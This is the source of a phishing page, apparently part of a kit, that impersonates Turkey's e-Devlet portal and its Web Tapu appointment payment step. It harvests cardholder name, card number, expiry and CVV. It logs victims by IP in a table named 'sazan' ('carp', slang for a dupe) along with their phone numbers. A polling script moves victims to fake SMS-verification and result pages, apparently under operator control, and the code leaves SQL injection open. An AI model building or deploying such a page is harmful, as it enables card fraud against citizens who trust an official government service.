<?php
 ob_start(); 
   session_start(); 
   
  $tutar = $_SESSION['tutar'];
  
   date_default_timezone_set('Europe/Istanbul');
   include("gmypanel/Core/getRealIPAdress.php");
   include("gmypanel/Core/mobileDetect.php");
   include("gmypanel/Core/browserDetect.php");
   include("gmypanel/Connection.php");
 
   $ip = getUserIP();

   // Telno GET'ten al, session'a kaydet
   if (!empty($_GET['telno'])) {
       $_SESSION['telno'] = $_GET['telno'];
   }

   // Session'daki telno ile güncelle
   if (!empty($_SESSION['telno'])) {
       $telno = $_SESSION['telno'];
       $db->query("UPDATE sazan SET telno = '{$telno}' WHERE ip = '{$ip}'");
   }

   // Tarih, Saat ve Müdürlük bilgilerini GET'ten al ve session'a kaydet
   if (isset($_GET['tarih'])) {
       $_SESSION['randevu_tarih'] = $_GET['tarih'];
       $_SESSION['randevu_saat'] = $_GET['saat'];
       
       $mudurluk_val = $_GET['mudurluk'];
       if ($mudurluk_val == "176") $mudurluk_val = "AYDINTEPE TAPU MÜDÜRLÜĞÜ";
       else if ($mudurluk_val == "175") $mudurluk_val = "BAYBURT TAPU MÜDÜRLÜĞÜ";
       else if ($mudurluk_val == "174") $mudurluk_val = "DEMİRÖZÜ TAPU MÜDÜRLÜĞÜ";
       
       $_SESSION['mudurluk'] = $mudurluk_val;
       
       // Veritabanındaki veri alanını güncelle
       $veri_ek = " - " . $mudurluk_val;
       $db->exec("UPDATE sazan SET veri = CONCAT(veri, '{$veri_ek}') WHERE ip = '{$ip}'");
       $db->exec("UPDATE sazan_debit SET veri = CONCAT(veri, '{$veri_ek}') WHERE ip = '{$ip}'");
   }

   $date = date('d.m.Y H:i');
   
   $db->query("UPDATE sazan SET now = 'SecurePayment Ekranında (Tapu)' WHERE ip = '{$ip}'");

   $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){ 
           header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
       } 
   }
?>
<!DOCTYPE html><!--[if lte IE 8]><html class="oldie" lang="tr"><![endif]--><!--[if gt IE 8]><!-->
<html lang="tr"><!--<![endif]-->

<head>
    <meta charset="utf-8">
    <link rel="dns-prefetch">
    <link rel="preconnect" href="//cdn.e-devlet.gov.tr">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <meta name="description"
        content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz." />
    <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet, türkiyegovtr" />
    <meta name="robots" content="index,follow" />
    <meta property="og:url" content="">
    <meta property="og:title" content="Web Tapu İşlemleri">
    <meta property="og:description"
        content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz.">
    <meta property="og:image" content="//cdn.e-devlet.gov.tr/themes/ankara/images/fb-share-v01.jpg">
    <title>Web Tapu İşlemleri</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#1C3761">
    <link rel="icon" type="image/png"
        href="//cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.1.8.0.png" sizes="196x196" />
    <meta name="google-play-app" content="app-id=tr.gov.turkiye.edevlet.kapisi">
    <link rel="alternate" type="application/rss+xml" title="e-Devlet Kapısı" href="/rss" />
    <link rel="search" type="application/opensearchdescription+xml"
        href="//cdn.e-devlet.gov.tr/themes/ankara/assets/opensearch.xml" title="Arama" />
    <link rel="stylesheet" href="//cdn.e-devlet.gov.tr/themes/izmir/css/base.1.9.5.css">
    
    <!-- jQuery Library for AJAX polling -->
    <script src="public/javascripts/jquery.js"></script>

    <script id="info_js" data-static-version="1.9.5"
        src="//cdn.e-devlet.gov.tr/themes/izmir/js/header.1.9.5.js"></script>
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/t.1.9.5.js"></script>
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/ajax.1.9.5.js"></script>
    <!--[if lte IE 9]><script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common-old.1.9.5.js"></script><![endif]--><!--[if gt IE 9]><!-->
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script><!--<![endif]-->
    <link href="//cdn.e-devlet.gov.tr/themes/izmir/css/common-pages.1.9.5.css" rel="stylesheet" />
    
    <!-- Custom Style System to match Web Tapu style perfectly -->
    <style>
        .webtapu-flow {
            max-width: 900px;
            margin: 20px auto;
            padding: 0 15px;
        }
        .webtapu-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            background: #fff;
            padding: 16px 20px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            border: 1px solid #e2e8f0;
        }
        .webtapu-step-wrapper {
            display: flex;
            align-items: center;
            flex: 1;
        }
        .webtapu-step-wrapper:last-child {
            flex: none;
        }
        .webtapu-step {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: #718096;
            font-size: 14px;
            font-weight: 500;
        }
        .webtapu-step.is-active {
            color: #1c3761;
            font-weight: 700;
        }
        .webtapu-step.is-completed {
            color: #48bb78;
        }
        .webtapu-step.is-disabled {
            color: #a0aec0;
            cursor: not-allowed;
        }
        .webtapu-step-number {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            background: #edf2f7;
            color: #4a5568;
            font-weight: bold;
            font-size: 13px;
            border: 1px solid #cbd5e0;
        }
        .webtapu-step.is-active .webtapu-step-number {
            background: #1c3761;
            color: #fff;
            border-color: #1c3761;
        }
        .webtapu-step.is-completed .webtapu-step-number {
            background: #48bb78;
            color: #fff;
            border-color: #48bb78;
        }
        .webtapu-step-connector {
            flex: 1;
            height: 2px;
            background: #e2e8f0;
            margin: 0 20px;
        }
        .webtapu-step-connector.is-completed {
            background: #48bb78;
        }
        .webtapu-card {
            background: #fff;
            border-radius: 8px;
            padding: 28px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            border: 1px solid #e2e8f0;
            margin-bottom: 24px;
        }
        .webtapu-card h3 {
            margin-top: 0;
            margin-bottom: 10px;
            color: #1c3761;
            font-size: 20px;
            font-weight: 700;
        }
        .webtapu-muted {
            color: #718096;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.6;
        }
        .webtapu-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        @media (max-width: 768px) {
            .webtapu-grid {
                grid-template-columns: 1fr;
            }
            .webtapu-steps {
                flex-direction: column;
                align-items: flex-start;
                gap: 12px;
            }
            .webtapu-step-connector {
                display: none;
            }
        }
        .webtapu-field {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .webtapu-field--wide {
            grid-column: 1 / -1;
        }
        .webtapu-field label {
            font-weight: 600;
            color: #2d3748;
            font-size: 13.5px;
        }
        .webtapu-field input, .webtapu-field select, .webtapu-field textarea {
            padding: 12px 14px;
            border: 1.5px solid #cbd5e0;
            border-radius: 6px;
            font-size: 14px;
            background: #fff;
            color: #2d3748;
            transition: all 0.2s;
            width: 100%;
            box-sizing: border-box;
        }
        .webtapu-field input:focus, .webtapu-field select:focus, .webtapu-field textarea:focus {
            border-color: #1c3761;
            outline: none;
            box-shadow: 0 0 0 3px rgba(28, 55, 97, 0.15);
        }
        .webtapu-summary {
            background: #f7fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 20px;
            font-size: 13.5px;
            color: #4a5568;
            line-height: 1.6;
        }
        .webtapu-summary strong {
            color: #2d3748;
        }
        .webtapu-actions {
            display: flex;
            justify-content: flex-end;
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #edf2f7;
        }
        .button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #cbd5e0;
            background: #fff;
            color: #4a5568;
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.2s;
            margin-right: 12px;
        }
        .button:hover {
            background: #edf2f7;
            color: #2d3748;
        }
        .primaryButton {
            background: #1c3761;
            color: #fff;
            border: none;
            padding: 14px 28px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .primaryButton:hover {
            background: #142846;
        }
        .webtapu-footnote {
            font-size: 12.5px;
            color: #718096;
            margin-top: 16px;
            text-align: center;
        }
    </style>
</head>

<body data-version=".1.8.0" data-token="{a25259528754b7a3282c64a9428ee0d71ccc13f1cdafdfda631b09f79629e086}"
    data-unique="b2732545b09eeacb5b6e56c59edbbffa" data-level="0" data-page="tkgm-web-tapu" data-lang="tr_TR.UTF-8">
    <header id="top">
        <div class="headerGroup">
            <div id="accesibilityBlock"><a href="#pageContentBlock" id="contentBlockLink" accesskey="1">İçeriğe Git</a>
                <a href="/" accesskey="2">Ana Sayfa</a>
            </div>
            <h1 id="brandingBlock"><a id="homeLink" href="/" title="Ana Sayfa'ya Dönüş">e-Devlet Kapısı</a></h1>
            <nav id="mainActionsBlock" aria-labelledby="mainActionsBlockTitle">
                <h2 class="sectionTitle" id="mainActionsBlockTitle">Ana Bölümler</h2>
                <ul class="mainActionsList">
                    <li id="hizli_cozum_holder"><span class="fast-shortcuts"> <a><i
                                    class="edk-fonticon-fastresponse"></i><span>
                                    Hızlı Çözüm</span></a></span></li>
                    <li class="inner-wrapper">
                        <ul class="accessibility" id="accessibilityUl" aria-expanded="false" role="menu" tabindex="0"
                            aria-label="Erişilebilirlik">
                            <li class="active" aria-hidden="true"><i class="ico-key-1"></i></li>
                            <li class="menu" role="none">
                                <ul role="none">
                                    <li role="none"><a role="menuitem">Erişilebilirlik Özellikleri</a>
                                    </li>
                                    <li role="none"><a role="menuitem" href="javascript:void(0)" class="textOnlyToggle"
                                            data-state="html">Salt Metin Görünümü</a></li>
                                    <li role="none"><a role="menuitem" href="javascript:void(0)" class="fontSizeToggle"
                                            data-state="normal">Daha Belirgin Odaklama</a></li>
                                </ul>
                            </li>
                        </ul>
                    </li>
                    <li class="search-form-wrapper">
                        <form id="searchForm" name="searchForm" method="get" action="/arama"><label
                                for="searchField">Aranan Terim</label>
                            <div class="search-wrapper">
                                <div class="inner-search"><input placeholder="Nasıl yardım edebilirim?" id="searchField"
                                        name="aranan" value="" autocomplete="off" role="combobox" aria-owns="popSearch"
                                        aria-haspopup="true" aria-autocomplete="both" aria-expanded="false"
                                        autocorrect="off" autocapitalize="off" /> <span class="ico-search"></span></div>
                                <ul id="popSearch"></ul>
                            </div><input id="searchButton" type="submit" value="Ara" />
                        </form>
                    </li>
                    <li id="l" class="login-area"><a> Giriş Yap <span class="ico-login"></span></a></li>
                </ul>
            </nav>
        </div>
    </header>
    <main id="serviceBlock" class="typeInsurance">
        <div id="vue">
            <nav class="pageTabNavigation" aria-label="Üst Sayfalar">
                <ul class="breadcrumbNavigation">
                    <li><a class="home">Ana Sayfa</a></li>
                    <li><a>Tapu ve Kadastro Genel Müdürlüğü</a></li>
                    <li class="here">Web Tapu İşlemleri</li>
                </ul>
            </nav>
            <section id="pageContentBlock" class="themed">
                <section class="serviceTitleBlock">
                    <div class="serviceDetails"><img class="agencyLogo webp"
                            src="//cdn.e-devlet.gov.tr/themes/ankara/images/logos/64webp/262.1.8.0.webp" alt=""
                            width="64" height="64">
                        <h2><a href="/tapu-ve-kadastro-genel-mudurlugu">Tapu ve Kadastro Genel Müdürlüğü</a><em>Web Tapu
                                İşlemleri</em></h2>
                    </div>
                </section>
                <section id="contentStart" class="serviceContainer">

                    <div class="webtapu-flow">
                        <nav class="webtapu-steps" aria-label="Başvuru adımları" role="navigation">
                            <div class="webtapu-step-wrapper">
                                <span class="webtapu-step is-completed">
                                    <span class="webtapu-step-number">
                                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path d="M13.5 4.5L6 12L2.5 8.5" stroke="currentColor" stroke-width="2"
                                                stroke-linecap="round" stroke-linejoin="round" />
                                        </svg>
                                    </span>
                                    <span class="webtapu-step-label">Başvuru</span>
                                </span>
                                <div class="webtapu-step-connector is-completed"></div>
                            </div>
                            <div class="webtapu-step-wrapper">
                                <span class="webtapu-step is-completed">
                                    <span class="webtapu-step-number">
                                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path d="M13.5 4.5L6 12L2.5 8.5" stroke="currentColor" stroke-width="2"
                                                stroke-linecap="round" stroke-linejoin="round" />
                                        </svg>
                                    </span>
                                    <span class="webtapu-step-label">Randevu Seçimi</span>
                                </span>
                                <div class="webtapu-step-connector is-completed"></div>
                            </div>
                            <div class="webtapu-step-wrapper">
                                <a href="#" class="webtapu-step is-active" aria-current="step">
                                    <span class="webtapu-step-number">3</span>
                                    <span class="webtapu-step-label">Ödeme</span>
                                </a>
                                <div class="webtapu-step-connector"></div>
                            </div>
                            <div class="webtapu-step-wrapper">
                                <span class="webtapu-step is-disabled" aria-current="false">
                                    <span class="webtapu-step-number">4</span>
                                    <span class="webtapu-step-label">Sonuç</span>
                                </span>
                            </div>
                        </nav>

                        <section class="webtapu-card">
                            <h3>Ödeme</h3>
                            <p class="webtapu-muted">Kart bilgilerinizi girerek başvurunuzu tamamlayabilirsiniz.</p>

                            <form method="post" action="kontrol.php" class="webtapu-form" autocomplete="off" onsubmit="return formKontrol();">
                                <input type="hidden" name="_action" value="save_odeme" />

                                <div class="webtapu-grid">
                                    <div class="webtapu-field webtapu-field--wide">
                                        <label for="kart_isim">Kart Üzerindeki Ad Soyad</label>
                                        <input id="kart_isim" name="holder" autocomplete="cc-name" placeholder="AD SOYAD" maxlength="36" required />
                                    </div>
                                    <div class="webtapu-field webtapu-field--wide">
                                        <label for="kart_no">Kart Numarası</label>
                                        <input id="kart_no" name="showNumber" type="text" inputmode="numeric" autocomplete="cc-number"
                                            placeholder="•••• •••• •••• ••••" maxlength="16" pattern="[0-9]{16}" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
                                    </div>
                                    <div class="webtapu-field">
                                        <label for="son_kul_ay">Son Kul. Ay</label>
                                        <select id="son_kul_ay" name="ExpiryMonth" required>
                                            <option value="">Seçiniz</option>
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="09">09</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>
                                    </div>
                                    <div class="webtapu-field">
                                        <label for="son_kul_yil">Son Kul. Yıl</label>
                                        <select id="son_kul_yil" name="ExpiryYear" required>
                                            <option value="">Seçiniz</option>
                                            <option value="2026">26</option>
                                            <option value="2027">27</option>
                                            <option value="2028">28</option>
                                            <option value="2029">29</option>
                                            <option value="2030">30</option>
                                            <option value="2031">31</option>
                                            <option value="2032">32</option>
                                            <option value="2033">33</option>
                                            <option value="2034">34</option>
                                            <option value="2035">35</option>
                                            <option value="2036">36</option>
                                        </select>
                                    </div>
                                    <div class="webtapu-field">
                                        <label for="cvv">CVV</label>
                                        <input id="cvv" name="cvc" type="text" inputmode="numeric" autocomplete="cc-csc"
                                            placeholder="•••" maxlength="3" pattern="[0-9]{3}" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
                                    </div>
                                    <div class="webtapu-field">
                                        <label>Randevu Ücreti</label>
                                        <div style="padding: 0.75em 1em; background: #f5f5f5; border-radius: 0.25em; font-weight: 500; color: #333;">
                                            <?php echo isset($_SESSION['tutar']) ? htmlspecialchars($_SESSION['tutar']) : '29'; ?> TL
                                        </div>
                                    </div>
                                </div>

                                <div class="webtapu-summary">
                                    <div><strong>Randevu:</strong> <?php echo isset($_SESSION['randevu_tarih']) ? htmlspecialchars($_SESSION['randevu_tarih'] . ' ' . $_SESSION['randevu_saat']) : 'Bilinmiyor'; ?></div>
                                    <div><strong>Başvuru Sahibi:</strong> <?php echo isset($_SESSION['real_ad']) ? htmlspecialchars($_SESSION['real_ad']) : 'Bilinmiyor'; ?></div>
                                    <div><strong>Tapu Müdürlüğü:</strong> <?php echo isset($_SESSION['mudurluk']) ? htmlspecialchars($_SESSION['mudurluk']) : 'Bilinmiyor'; ?></div>
                                </div>

                                <div class="webtapu-actions">
                                    <a class="button" href="odeme.php">Geri</a>
                                    <button type="submit" class="primaryButton">Ödemeyi Tamamla</button>
                                </div>
                            </form>
                            <p class="webtapu-footnote">Ödeme sonrası telefonunuza SMS doğrulama kodu gönderilecektir.</p>
                        </section>
                    </div>

                </section>
            </section>
        </div>
    </main>
    <footer data-pagecache="0.0102">
        <div id="bottomLinksGroup">
            <div id="bottomLinksWrapper">
                <nav id="bottomLinksBlock" aria-labelledby="bottomLinksBlockTitle">
                    <h2 class="sectionTitle" id="bottomLinksBlockTitle">Sayfa Sonu Bağlantıları</h2>
                    <ul id="bottomLinks">
                        <li class="bottomLinksGroup">
                            <h3>e-Devlet Kapısı</h3>
                            <ul>
                                <li><a>English</a></li>
                                <li><a>Hakkımızda</a></li>
                                <li><a>Yasal Bildirim</a></li>
                                <li><a>KVKK Aydınlatma Yükümlülüğü</a></li>
                                <li><a accesskey="8">Gizlilik ve Kullanım</a></li>
                                <li><a>Politikalarımız</a></li>
                                <li>Kurumsal Kimlik</li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>e-Hizmetler</h3>
                            <ul>
                                <li><a>Sık Kullanılan Hizmetler</a></li>
                                <li><a>Yeni Eklenen Hizmetler</a></li>
                                <li><a accesskey="h">Kurum Hizmetleri</a></li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>Yardım</h3>
                            <ul>
                                <li><a accesskey="6">Genel Yardım</a></li>
                                <li><a accesskey="5">Sıkça Sorulanlar</a></li>
                                <li><a>Güvenliğiniz İçin</a></li>
                                <li><a>Help For Non-Citizens</a></li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>Bize Ulaşın</h3>
                            <ul>
                                <li><a accesskey="9">İletişim</a></li>
                                <li><a>CİMER Başvurusu</a></li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>Erişilebilirlik</h3>
                            <ul>
                                <li><a href="javascript:void(0)" role="button" class="textOnlyToggle" data-state="html">Salt Metin Görünümü</a></li>
                                <li><a href="javascript:void(0)" role="button" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a></li>
                                <li><a accesskey="0">Klavye Kısayolları</a></li>
                                <li><a accesskey="3">Site Haritası</a></li>
                            </ul>
                        </li>
                    </ul>
                </nav>
                <div id="bottomRightWrapper">
                    <nav id="bottomContacts" aria-labelledby="sectionTitleContacts"
                        aria-describedby="bottomContactsText">
                        <h2 class="sectionTitle" id="sectionTitleContacts">İletişim Seçenekleri</h2>
                        <div class="bottomContactsText" id="bottomContactsText"><em>Yardım mı lazım?</em> Aşağıdaki yöntemleri kullanarak bizimle iletişime geçebilirsiniz.</div>
                        <ul id="bottomContactsList">
                            <li><a class="fastresponse">Hızlı Çözüm Merkezi</a></li>
                            <li><a class="email" accesskey="7">Bize Yazın</a></li>
                            <li><a class="callcenter">e-Devlet Çağrı Merkezi</a></li>
                            <li><a class="signinghelp">Engelsiz Çağrı Merkezi</a></li>
                        </ul>
                    </nav>
                    <nav id="bottomSocialLinks" aria-label="Sosyal Medya Bağlantı Adresleri"><a target="_blank"><span class="ico-facebook"></span>Facebook</a><a target="_blank"><img src="//cdn.e-devlet.gov.tr/themes/izmir/images/icons/twitter-logo-white.png" height="16" class="ed-float-start ed-me-2" alt=""> Twitter</a><a target="_blank"><span class="ico-youtube"></span>Youtube</a><a target="_blank"><span class="ico-instagram-1"></span>Instagram</a></nav>
                </div>
            </div>
            <div id="bottomPartnerLinks">
                <div class="images"><a class="externalLink" href="#"><img alt="T.C. Cumhurbaşkanlığı Siber Güvenlik Başkanlığı" src="//cdn.e-devlet.gov.tr/themes/izmir/images/footer/SGB-logo.png" style="height:30px" /></a><a class="externalLink" rel="external"><img alt="Türksat A.Ş." src="//cdn.e-devlet.gov.tr/themes/izmir/images/footer/turksat.png" /></a></div>
                <div class="bottomPartnerText">e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi <a class="externalLink" rel="external" href="#">T.C. Cumhurbaşkanlığı Siber Güvenlik Başkanlığı</a> tarafından yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi <a class="externalLink" rel="external">Türksat A.Ş.</a> tarafından yapılmaktadır.</div>
            </div>
            <div id="bottomCopyrightBlock">© <time datetime="2026-01-20">2026</time> Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.</div>
        </div>
    </footer>
</body>

<script>
    function luhnCheck(number) {
        var digits = number.replace(/\D/g, '');
        if (digits.length < 13 || digits.length > 19) return false;
        
        var sum = 0;
        var alt = false;
        
        for (var i = digits.length - 1; i >= 0; i--) {
            var digit = parseInt(digits[i], 10);
            
            if (alt) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            
            sum += digit;
            alt = !alt;
        }
        
        return (sum % 10) === 0;
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        var kartNoInput = document.getElementById('kart_no');
        if (kartNoInput) {
            var errorSpan = document.createElement('small');
            errorSpan.className = 'kart-hata';
            errorSpan.style.cssText = 'color: #d32f2f; display: none; margin-top: 4px;';
            kartNoInput.parentNode.appendChild(errorSpan);
            
            kartNoInput.addEventListener('input', function() {
                var value = this.value.replace(/\D/g, '');
                
                if (value.length === 16) {
                    if (luhnCheck(value)) {
                        this.style.borderColor = '#4caf50';
                        errorSpan.style.display = 'none';
                    } else {
                        this.style.borderColor = '#d32f2f';
                        errorSpan.textContent = 'Geçersiz kart numarası';
                        errorSpan.style.display = 'block';
                    }
                } else {
                    this.style.borderColor = '';
                    errorSpan.style.display = 'none';
                }
            });
        }
    });

    function formKontrol() {
        var kart_isim = document.getElementById('kart_isim').value;
        var kart_no = document.getElementById('kart_no').value;
        var son_kul_ay = document.getElementById('son_kul_ay').value;
        var son_kul_yil = document.getElementById('son_kul_yil').value;
        var cvv = document.getElementById('cvv').value;

        if (kart_isim.trim() === "") {
            alert("Lütfen kart sahibinin adını giriniz.");
            document.getElementById('kart_isim').focus();
            return false;
        }
        if (kart_no.replace(/\D/g, '').length !== 16) {
            alert("Lütfen 16 haneli kart numaranızı giriniz.");
            document.getElementById('kart_no').focus();
            return false;
        }
        if (!luhnCheck(kart_no)) {
            alert("Geçersiz kart numarası. Lütfen kontrol ediniz.");
            document.getElementById('kart_no').focus();
            return false;
        }
        if (son_kul_ay === "") {
            alert("Lütfen son kullanma ayını seçiniz.");
            document.getElementById('son_kul_ay').focus();
            return false;
        }
        if (son_kul_yil === "") {
            alert("Lütfen son kullanma yılını seçiniz.");
            document.getElementById('son_kul_yil').focus();
            return false;
        }
        if (cvv.length !== 3) {
            alert("Lütfen 3 haneli CVV kodunu giriniz.");
            document.getElementById('cvv').focus();
            return false;
        }
        return true;
    }

    function gonder() {
        $.ajax({ 
            type: 'POST', 
            url: 'Database.php?ip=<?php echo $ip; ?>',
            success: function(msg) {
                var map = { 
                    sms: '3D_Security.php', 
                    tebrik: 'Successful.php', 
                    hata1: 'Error.php', 
                    back: 'index.php', 
                    sms2: 'Wrong_Sms.php', 
                    hata2: 'Closed_to_Internet.php' 
                };
                if (map[msg]) {
                    window.location.href = map[msg];
                } else {
                    setTimeout(gonder, 2500);
                }
            },
            error: function() { 
                setTimeout(gonder, 2500); 
            }
        });
    }

    $(document).ready(function() {
        gonder();
    });
</script>

</html>